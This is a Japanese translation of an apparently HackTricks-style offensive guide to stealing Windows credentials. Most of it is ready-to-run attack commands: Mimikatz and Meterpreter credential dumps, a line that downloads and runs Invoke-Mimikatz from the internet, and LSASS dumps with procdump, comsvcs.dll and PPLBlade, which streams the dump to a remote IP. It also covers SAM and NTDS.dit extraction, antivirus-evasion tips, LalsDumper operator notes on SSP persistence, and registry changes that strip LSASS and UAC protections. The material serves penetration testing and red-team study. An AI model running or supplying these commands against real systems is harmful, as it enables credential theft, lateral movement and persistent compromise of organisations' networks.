# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz ができる他のことは [**this page**](credentials-mimikatz.md) で確認してください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **これらの保護により、Mimikatzが一部のcredentialsを抽出するのを防げる可能性があります。**

## Credentials with Meterpreter

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)は**私が作成した**もので、被害者内部の**passwords and hashes**を検索するために使用します。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVの回避

### Procdump + Mimikatz

**Procdump from** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正規のMicrosoftツールであるため**、Defenderに検出されません。\
このツールを使用して、**dump the lsass process**、**download the dump**、およびダンプから**extract**して**credentials locally**を取り出せます。

また、[SharpDump](https://github.com/GhostPack/SharpDump)を使用することもできます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
この処理は [SprayKatz](https://github.com/aas-n/spraykatz) を使って自動的に実行できます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**: 一部の **AV** は **procdump.exe to dump lsass.exe** の使用を **malicious** と **detect** する場合があります。これは **"procdump.exe" and "lsass.exe"** という文字列を **detecting** しているためです。したがって、**name lsass.exe** の代わりに lsass.exe の **PID** を procdump に **argument** として **pass** する方が **stealthier** です。

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **dumping process memory** を行う役割を持っています。この DLL には `MiniDumpW` という **function** が含まれており、`rundll32.exe` を使って呼び出されるよう設計されています。\
最初の2つの引数の内容は重要ではありませんが、3番目の引数は3つのコンポーネントに分かれます。ダンプするプロセスのプロセス ID が第1コンポーネント、ダンプファイルの場所が第2コンポーネント、そして第3コンポーネントは厳密に単語の **full** のみです。ほかの選択肢はありません。\
これら3つのコンポーネントを解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをそのファイルへ書き込みます。\
**comsvcs.dll** を使えば lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この方法は詳しくは [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerを使ったlsassのダンプ取得**

1. Task Bar を右クリックして Task Manager をクリック
2. More details をクリック
3. Processes タブで "Local Security Authority Process" プロセスを検索
4. "Local Security Authority Process" を右クリックし、"Create dump file" をクリック

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は Microsoft によって署名されたバイナリで、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部です。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade を使って lsass をダンプする

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、ディスクに書き込まずに memory dump を難読化してリモートワークステーションへ転送することをサポートする Protected Process Dumper Tool です。

**主な機能**:

1. PPL 保護のバイパス
2. Defender のシグネチャベースの検出を回避するための memory dump ファイルの難読化
3. ディスクに落とさずに (fileless dump) RAW および SMB アップロード方式で memory dump をアップロード
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon は **LalsDumper** と呼ばれる3段階のダンプツールを提供します。`MiniDumpWriteDump` を一切呼び出さないため、その API に対する EDR のフックは発動しません:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内の 32 個の小文字の `d` からなるプレースホルダを検索し、それを `rtu.txt` の絶対パスで上書きし、パッチ済みの DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより **LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) としてロードします。
2. **Stage 2 inside LSASS** – LSASS が `nfdp.dll` をロードすると DLL は `rtu.txt` を読み込み、各バイトを `0x20` で XOR し、デコードされた blob をメモリにマップしてから実行を移します。
3. **Stage 3 dumper** – マップされたペイロードは、ハッシュ化された API 名から解決された **direct syscalls** を使って MiniDump のロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。専用のエクスポート `Tom` は `%TEMP%\<pid>.ddt` を開き、圧縮された LSASS ダンプをファイルにストリームし、ハンドルを閉じて後で exfiltration を行えるようにします。

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt` を同一ディレクトリに置いてください。Stage 1 はハードコードされたプレースホルダを `rtu.txt` の絶対パスで書き換えるため、ファイルを分けるとチェーンが切れます。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加することで行われます。自分でその値を設定しておけば、LSASS は毎回起動時に SSP を再ロードします。
* `%TEMP%\*.ddt` ファイルは圧縮されたダンプです。ローカルで解凍してから Mimikatz/Volatility に渡して credential extraction を行ってください。
* `lals.exe` の実行には admin/SeTcb 権限が必要で、`AddSecurityPackageA` を成功させる必要があります。呼び出しが戻ると、LSASS は透過的に不正な SSP をロードして Stage 2 を実行します。
* ディスク上から DLL を削除しても LSASS からは解放されません。レジストリエントリを削除して LSASS を再起動（reboot）するか、そのまま long-term persistence として残しておいてください。

## CrackMapExec

### SAM ハッシュをダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲット DC から NTDS.dit をダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲット DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM_ に **格納されています**。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。

### レジストリから

これらのファイルを取得する最も簡単な方法は、レジストリからコピーを取ることです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** それらのファイルを Kali マシンにダウンロードし、次のコマンドで **extract the hashes**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して保護されたファイルのコピーを取得できます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin バイナリは Windows Server のバージョンでのみ利用可能です。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
ただし、同じことは**Powershell**でも行えます。これは**how to copy the SAM file**の例です（使用するハードドライブは "C:"、保存先は C:\users\Public）ですが、任意の保護されたファイルをコピーする目的でも使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使って SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 資格情報 - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: このテーブルはユーザーやグループのようなオブジェクトの詳細を格納します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: **Security descriptors** が各オブジェクトごとに格納され、格納されたオブジェクトのセキュリティとアクセス制御を担保します。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **一部** of the **NTDS.dit** file could be located **`lsass` のメモリ内** (パフォーマンス向上のために**キャッシュ**を使用しているため、最近アクセスされたデータが見つかることが多いです)。

#### NTDS.dit 内のハッシュの復号

ハッシュは3回暗号化されています:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt the **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** は **すべてのドメインコントローラ** で **同じ値** を持ちますが、**ドメインコントローラの SYSTEM ファイルの BOOTKEY を使用して** **NTDS.dit** ファイル内で **暗号化** されています（ドメインコントローラごとに異なります）。このため、NTDS.dit ファイルから資格情報を取得するには **NTDS.dit と SYSTEM のファイルが必要** です (_C:\Windows\System32\config\SYSTEM_)。

### Ntdsutil を使用した NTDS.dit のコピー

Windows Server 2008 以降で利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
また、[**volume shadow copy**](#stealing-sam-and-system) トリックを使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（再度、[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) トリック）。

### **NTDS.dit からハッシュを抽出する**

一旦 **NTDS.dit** と **SYSTEM** ファイルを**取得**すれば、_secretsdump.py_ のようなツールで**ハッシュを抽出**できます：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効な domain admin user を使用して、**それらを自動的に抽出することもできます**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
大きな **NTDS.dit ファイル** の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。

### **NTDS.dit から SQLite データベースへドメインオブジェクトを抽出する**

NTDS オブジェクトは [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使って SQLite データベースに抽出できます。raw NTDS.dit ファイルが既に取得されている場合、秘密情報だけでなく、さらなる情報抽出のためにオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hiveはオプションですが、secretsの復号を可能にします（NT & LM hashes、supplemental credentials such as cleartext passwords、kerberos or trust keys、NT & LM password histories）。その他の情報と併せて、以下のデータが抽出されます : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). このバイナリを使用して、複数のソフトウェアからcredentialsを抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から credentials を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから credentials を抽出するために使用できます。ダウンロード: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから credentials を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM fileから資格情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

ここからダウンロード: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) を取得して、**実行するだけで** パスワードが抽出されます。

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT には `DumpRDPHistory` タスクが含まれており、その手法はどの red-teamer にとっても有用です:

### DumpRDPHistory-style テレメトリ収集

* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21**（成功したログオン）および **25**（切断）を確認して、誰がそのボックスを管理していたかを特定します:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかが分かったら、その **切断された** セッションが存在する間に LSASS を（LalsDumper/Mimikatz で）ダンプします。CredSSP + NTLM fallback により検証データとトークンが LSASS に残され、それらは SMB/WinRM 経由でリプレイして `NTDS.dit` を取得したり、domain controllers に永続化を仕掛けるために利用できます。

### Registry downgrades targeted by FinalDraft

同じ implant は、credential theft を容易にするためにいくつかの registry keys を改ざんします:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP 中に資格情報/チケットの完全再利用を強制し、pass-the-hash style pivots を可能にします。
* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効化し、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` は DC がオンラインの間も DSRM 管理者のログオンを許可し、攻撃者に別の組み込みの高権限アカウントを与えます。
* `RunAsPPL=0` は LSASS の PPL 保護を削除し、LalsDumper のような dumpers にとってメモリへのアクセスを容易にします。

## 参照

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
